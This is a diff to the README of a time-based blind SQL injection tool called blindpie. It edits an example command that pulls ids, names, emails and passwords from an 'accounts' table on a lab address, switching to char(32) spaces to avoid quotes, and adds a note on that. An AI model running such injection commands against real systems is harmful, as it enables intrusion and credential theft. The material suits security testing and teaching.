@@ -147,7 +147,7 @@ The script will test each character of each row and will print the rows found.
 You can extract multiple columns at a time by concatenating the values. Use the `concat` function as the column name:
 
 ```
-$ python3 blindpie.py -u http://192.168.0.104/sqli/time_based_blind.php -p email -d email@ddress.com --get -M0 -T10 attack --table accounts --column "concat(id, ' ', first_name, ' ', last_name, ' ', email, ' ', password)" --param email --row 0 --rows 10
+$ python3 blindpie.py -u http://192.168.0.104/sqli/time_based_blind.php -p email -d email@ddress.com --get -M0 -T10 attack --table accounts --column "concat(id, char(32), first_name, char(32), last_name, char(32), email, char(32), password)" --param email --row 0 --rows 10
   _     _ _           _       _
  | |   | (_)         | |     (_)
  | |__ | |_ _ __   __| |_ __  _  ___
@@ -183,7 +183,9 @@ $ python3 blindpie.py -u http://192.168.0.104/sqli/time_based_blind.php -p email
 [*] all done in 373.877 sec
 ```
 
-Note: a row can't be longer than `MAX_ROW_LENGTH` (by default is 128) or it will be ignored and considered empty.
+Note #1: a row can't be longer than `MAX_ROW_LENGTH` (by default is 128) or it will be ignored and considered empty.
+
+Note #2: `char(32)` is the 'space' character.
 
 ## Authors
 
